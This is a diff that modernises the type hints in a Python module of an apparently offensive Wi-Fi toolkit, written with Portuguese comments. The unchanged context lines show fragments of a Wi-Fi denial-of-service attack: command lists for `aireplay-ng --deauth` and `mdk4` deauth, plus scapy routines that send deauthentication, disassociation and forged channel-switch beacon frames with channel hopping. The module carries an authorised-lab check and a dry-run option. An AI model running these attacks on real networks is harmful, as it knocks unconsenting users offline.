@@ -9,14 +9,14 @@ broadcast e hopping de canal por banda.
 Version: 1.0.0
 """
 
-from __future__ import annotations
 
 import logging
 import shutil
 import struct
 import subprocess
 import time
-from typing import List, Optional, Sequence, Tuple
+from typing import List, Optional, Tuple
+from collections.abc import Sequence
 
 from wirelessxpl.core.exploit import *
 from wirelessxpl.core.os_guard import OSRequirement, requires_os
@@ -24,8 +24,8 @@ from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab,
 
 logger = logging.getLogger(__name__)
 
-_CHANNELS_2G: Tuple[int, ...] = tuple(range(1, 12))
-_CHANNELS_5G: Tuple[int, ...] = (
+_CHANNELS_2G: tuple[int, ...] = tuple(range(1, 12))
+_CHANNELS_5G: tuple[int, ...] = (
     36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
     132, 136, 140, 144, 149, 153, 157, 161, 165,
 )
@@ -80,7 +80,7 @@ class Exploit(Exploit):
     band = OptString("2g", "Banda para hopping: 2g | 5g | both")
     dry_run = OptBool(False, "Somente exibir comandos / plano, sem injetar ou executar ferramentas")
 
-    def _channels_for_band(self) -> List[int]:
+    def _channels_for_band(self) -> list[int]:
         """Lista de canais usados quando ``channel == 0``."""
         b = str(self.band).strip().lower()
         if b not in _BANDS:
@@ -123,7 +123,7 @@ class Exploit(Exploit):
         self,
         channels: Sequence[int],
         hop_index: int,
-    ) -> Tuple[Optional[int], int]:
+    ) -> tuple[int | None, int]:
         """Retorna canal atual (ou None se fixo) e próximo índice de hop."""
         if int(self.channel) > 0:
             return int(self.channel), hop_index
@@ -132,7 +132,7 @@ class Exploit(Exploit):
         ch = channels[hop_index % len(channels)]
         return ch, hop_index + 1
 
-    def _run_aireplay_once(self, iface: str, deauth_count: int, ch: Optional[int]) -> None:
+    def _run_aireplay_once(self, iface: str, deauth_count: int, ch: int | None) -> None:
         """Uma execução de aireplay-ng --deauth."""
         aireplay = shutil.which("aireplay-ng")
         if not aireplay:
@@ -140,7 +140,7 @@ class Exploit(Exploit):
             return
         bssid = str(self.target_bssid).strip()
         client = str(self.target_client).strip()
-        cmd: List[str] = [
+        cmd: list[str] = [
             "sudo",
             aireplay,
             "--deauth",
@@ -170,7 +170,7 @@ class Exploit(Exploit):
             return
         bssid = str(self.target_bssid).strip()
         client = str(self.target_client).strip()
-        cmd: List[str] = ["sudo", mdk4, iface, "d", "-B", bssid, "-c", ch_arg]
+        cmd: list[str] = ["sudo", mdk4, iface, "d", "-B", bssid, "-c", ch_arg]
         if client and client.upper() != "FF:FF:FF:FF:FF:FF":
             cmd.extend(["-S", client])
         if self.dry_run:
@@ -182,7 +182,7 @@ class Exploit(Exploit):
         except KeyboardInterrupt:
             print_info("mdk4 interrompido.")
 
-    def _send_scapy_deauth_round(self, iface: str, ch: Optional[int]) -> int:
+    def _send_scapy_deauth_round(self, iface: str, ch: int | None) -> int:
         """Um ciclo de deauth (1 broadcast ou par AP↔STA). Retorna frames enviados."""
         try:
             from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
@@ -223,7 +223,7 @@ class Exploit(Exploit):
             time.sleep(float(self.interval))
         return n
 
-    def _send_scapy_disassoc_round(self, iface: str, ch: Optional[int]) -> int:
+    def _send_scapy_disassoc_round(self, iface: str, ch: int | None) -> int:
         """Um ciclo de desassociação. Retorna frames enviados."""
         try:
             from scapy.all import Dot11, Dot11Disas, RadioTap, sendp
@@ -264,7 +264,7 @@ class Exploit(Exploit):
             time.sleep(float(self.interval))
         return n
 
-    def _send_scapy_csa_once(self, iface: str, ch: Optional[int]) -> int:
+    def _send_scapy_csa_once(self, iface: str, ch: int | None) -> int:
         """Um beacon com IE CSA (ID 37)."""
         try:
             from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
